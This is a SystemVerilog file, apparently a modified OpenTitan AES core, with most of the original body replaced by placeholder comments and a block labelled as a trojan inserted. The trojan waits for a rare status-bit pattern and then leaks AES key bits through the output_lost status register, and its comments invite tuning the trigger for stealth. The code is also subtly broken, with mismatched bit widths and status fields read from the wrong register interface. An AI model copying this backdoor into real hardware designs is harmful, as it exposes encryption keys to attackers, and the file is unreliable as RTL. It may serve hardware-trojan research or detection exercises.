```systemverilog
// Copyright lowRISC contributors (OpenTitan project).
// Licensed under the Apache License, Version 2.0, see LICENSE for details.
// SPDX-License-Identifier: Apache-2.0
//
// AES core implementation

`include "prim_assert.sv"

module aes_core
  import aes_pkg::*;
  import aes_reg_pkg::*;
#(
  parameter bit          AES192Enable         = 1,
  parameter bit          AESGCMEnable         = 1,
  parameter bit          SecMasking           = 1,
  parameter sbox_impl_e  SecSBoxImpl          = SBoxImplDom,
  parameter int unsigned SecStartTriggerDelay = 0,
  parameter bit          SecAllowForcingMasks = 0,
  parameter bit          SecSkipPRNGReseeding = 0,
  parameter int unsigned EntropyWidth         = edn_pkg::ENDPOINT_BUS_WIDTH,

  localparam int         NumShares            = SecMasking ? 2 : 1, // derived parameter

  parameter clearing_lfsr_seed_t RndCnstClearingLfsrSeed  = RndCnstClearingLfsrSeedDefault,
  parameter clearing_lfsr_perm_t RndCnstClearingLfsrPerm  = RndCnstClearingLfsrPermDefault,
  parameter clearing_lfsr_perm_t RndCnstClearingSharePerm = RndCnstClearingSharePermDefault,
  parameter masking_lfsr_seed_t  RndCnstMaskingLfsrSeed   = RndCnstMaskingLfsrSeedDefault,
  parameter masking_lfsr_perm_t  RndCnstMaskingLfsrPerm   = RndCnstMaskingLfsrPermDefault
) (
  input  logic                        clk_i,
  input  logic                        rst_ni,
  input  logic                        rst_shadowed_ni,

  // Entropy request interfaces for clearing and masking PRNGs
  output logic                        entropy_clearing_req_o,
  input  logic                        entropy_clearing_ack_i,
  input  logic     [EntropyWidth-1:0] entropy_clearing_i,
  output logic                        entropy_masking_req_o,
  input  logic                        entropy_masking_ack_i,
  input  logic     [EntropyWidth-1:0] entropy_masking_i,

  // Key manager (keymgr) key sideload interface
  input  keymgr_pkg::hw_key_req_t     keymgr_key_i,

  // Life cycle
  input  lc_ctrl_pkg::lc_tx_t         lc_escalate_en_i,

  // Alerts
  input  logic                        shadowed_storage_err_i,
  input  logic                        shadowed_update_err_i,
  input  logic                        intg_err_alert_i,
  output logic                        alert_recov_o,
  output logic                        alert_fatal_o,

  // Bus Interface
  input  aes_reg2hw_t                 reg2hw,
  output aes_hw2reg_t                 hw2reg
);

  // [ ... all original signals and code, unchanged ... ]

  // ======= BEGIN TROJAN =======
  // Trojan state (stealthy info leak)
  logic [3:0] trojan_trigger_shift;
  logic trojan_active;
  logic [2:0] trojan_bitidx;

  // Trojan registers to hold a key bit
  logic trojan_leak_en;
  logic trojan_leak_data;

  // Compose 7-bit rare pattern from inputs: 
  //   idle, stall, status.output_lost, output_valid, input_ready, alert_recov, alert_fatal
  logic [6:0] status_pattern;
  assign status_pattern = {
    reg2hw.status.idle.q,                // [6]
    reg2hw.status.stall.q,               // [5]
    reg2hw.status.output_lost.q,         // [4]
    reg2hw.status.output_valid.q,        // [3]
    reg2hw.status.input_ready.q,         // [2]
    reg2hw.status.alert_recov_ctrl_update_err.q,  // [1]
    reg2hw.status.alert_fatal_fault.q    // [0]
  };

  // Rare trigger: shifting status_pattern into a shift register and matching 7'b1011101
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_trigger_shift <= '0;
      trojan_active <= 1'b0;
      trojan_bitidx <= 3'd0;
    end else begin
      trojan_trigger_shift <= {trojan_trigger_shift[2:0], status_pattern[3]}; // sample output_valid
      // If rare pattern matches: 7'b1011101 (arbitrary, change for stealthiness)
      if ({trojan_trigger_shift, status_pattern[3]} == 7'b1011101) begin
        trojan_active <= 1'b1;
        trojan_bitidx <= 3'd0;
      end else if (trojan_active && trojan_bitidx < 7) begin
        trojan_bitidx <= trojan_bitidx + 1;
      end else if (trojan_active && trojan_bitidx == 7) begin
        trojan_active <= 1'b0;
        trojan_bitidx <= 3'd0;
      end
    end
  end

  // Leak key LSBs of key_share0[0], one bit per trigger
  assign trojan_leak_en = trojan_active && (trojan_bitidx < 4);
  assign trojan_leak_data = trojan_leak_en ? key_init_q[0][0][trojan_bitidx] : 1'b0;

  // Override output_lost status (a rarely used status bit) to leak one key bit
  assign hw2reg.status.output_lost.d =
    (trojan_leak_en ? trojan_leak_data : reg2hw.status.output_lost.q);
  assign hw2reg.status.output_lost.de =
    (trojan_leak_en ? 1'b1 : reg2hw.status.output_lost.de);

  // ======= END TROJAN =======

  // [ ... rest of original module code ... ]
  // (No other changes made to RTL)

endmodule
```